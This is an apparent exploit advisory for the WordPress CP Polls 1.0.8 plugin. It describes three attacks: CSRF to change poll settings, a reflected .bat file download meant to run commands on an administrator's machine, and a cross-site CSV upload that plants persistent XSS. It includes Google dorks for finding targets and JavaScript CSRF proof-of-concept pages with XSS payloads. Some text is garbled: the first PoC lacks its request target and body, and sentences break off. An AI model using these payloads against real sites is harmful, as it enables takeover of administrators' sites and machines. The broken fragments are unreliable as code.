# Date: 2016-02-22
# Google Dork: Index of /wp-content/plugins/cp-polls/
# Exploit Author: Joaquin Ramirez Martinez [ i0akiN SEC-LABORATORY ]
# Version: 1.0.8
 
=============
 Description
=============
 
With **CP Polls** you can publish a poll into a page/post and optionally display statistics of the results.
You can receive email notifications every time a vote is added or opt to receive Excel reports periodically.
 
The Polls can have dependant questions, this means that some questions are displayed depending of the
selection made on other questions.
 
(copy of README.txt)
 
 
===================
 Technical details
===================
 
values of the options before savinng to database. This issue can be exploited by an attacker with
action will be executed because there isn&#039;t CSRF protection.
 
=========================
 Proof of Concept (html)
=========================
 
<html>
  <!-- CSRF PoC - Burp Suite i0 SecLab plugin -->
  <!-- We can find the Poll id into the source code of a post with a cp poll and looking for ´CP_Polls_id´.
  We can find something like: <input type="hidden" name="CP_Polls_id" value="4" />
  4 is the Poll&#039;s id, now we have the id and we can make a csrf attack.
   -->
<body>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.setRequestHeader("Accept-Language", "es-MX,es-ES;q=0.9,es;q=0.7,es-AR;q=0.6,es-CL;q=0.4,en-US;q=0.3,en;q=0.1");
        xhr.withCredentials = true;
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i);
        xhr.send(new Blob([aBody]));
      }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>
 
 
################################################################################
 
 
# Exploit Title: WordPress CP Polls 1.0.8 - Reflected file download (.bat file)
# Date: 2016-02-22
# Google Dork: Index of /wp-content/plugins/cp-polls/
# Exploit Author: Joaquin Ramirez Martinez [ i0akiN SEC-LABORATORY ]
# Version: 1.0.8
# Demo: https://www.youtube.com/watch?v=uc6P59BPEkU
 
===================
 Technical details
===================
 
exploiting a CSRF in the &#039;change cp poll name&#039; converting the downloadable report file (csv) to a malicious .bat file.
Because there is not restriction in the cp poll name the CSRF exploit can change the name to ...
 
malicious.bat;
 
The semicolon (;) character must be restricted because the header &#039;Content-Disposition&#039; uses this characteer as a
parameter delimitation. For example, when we change the name of a cp poll to &#039;malicious.bat;&#039; when an administrator
download the report (thinking that is a csv file) the response header turns:
""
Content-Disposition: attachment; file=malicious.bat;.csv
""
the csv is ignored and the administrator gets a .BAT file
 
 
So, how to exploit this vulnerability to execute commands on the victim&#039;s machine?
Whe have an option. If the cp_poll is added in a post we can vote them and we can inject our malicious payload
into a votation.
 
==============================
 Proof of Concept CSRF (html)
==============================
 
https://www.youtube.com/watch?v=uc6P59BPEkU
 
==========================
 
If the csrf attack is succesful, we only need to inject our commands in votations. In ´fieldnames´ post parameter
 we can inject our commands.
 
 
################################################################################
 
 
# Exploit Title: WordPress CP Polls 1.0.8 - Cross-site file upload & persistent XSS
# Date: 2016-02-22
# Google Dork: Index of /wp-content/plugins/cp-polls/
# Exploit Author: Joaquin Ramirez Martinez [ i0akiN SEC-LABORATORY ]
# Version: 1.0.8
 
===================
 Technical details
===================
 
When we register an cp_poll, it is sanitized correctly but when we upload a CSV file, we can
bypass the protection and inject malicious HTML/Javascript.
 
There are not CSRF protection in that action so it can be exploited with a CSRF attack by sending a
malicious link to a victim (administrator) a wait for execution of the malicious request.
 
=========================
 Proof of Concept (html)
=========================
 
<html>
<body>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http://<wp.host>/wp-admin/admin.php?page=CP_Polls&cal=1&list=1&import=1", true);
        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------17460754011784");
        xhr.setRequestHeader("Accept-Language", "es-MX,es-ES;q=0.9,es;q=0.7,es-AR;q=0.6,es-CL;q=0.4,en-US;q=0.3,en;q=0.1");
        xhr.withCredentials = true;
        var body = "-----------------------------17460754011784\r\n" +
          "Content-Disposition: form-data; name=\"importfile\"; filename=\"csv.csv\"\r\n" +
          "Content-Type: application/octet-stream\r\n" +
          "\r\n" +
          "2013-04-21 18:50:00, 192.168.1.12, <img src=x onerror=alert(&#039;You_are_owned!&#039;)>,
           \"<img src=x onerror=alert(&#039;I am scared!&#039;)>\", \"sample subject\", \"\"\r\n" +
          "-----------------------------17460754011784\r\n" +
          "Content-Disposition: form-data; name=\"pbuttonimport\"\r\n" +
          "\r\n" +
          "Import\r\n" +
          "-----------------------------17460754011784--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>
 
 
==========
 CREDITS
==========
 
Vulnerability discovered by:
    Joaquin Ramirez Martinez [i0 security-lab]
    joaquin.ramirez.mtz.lab[at]gmail[dot]com
    https://www.facebook.com/I0-security-lab-524954460988147/
    https://www.youtube.com/channel/UCe1Ex2Y0wD71I_cet-Wsu7Q

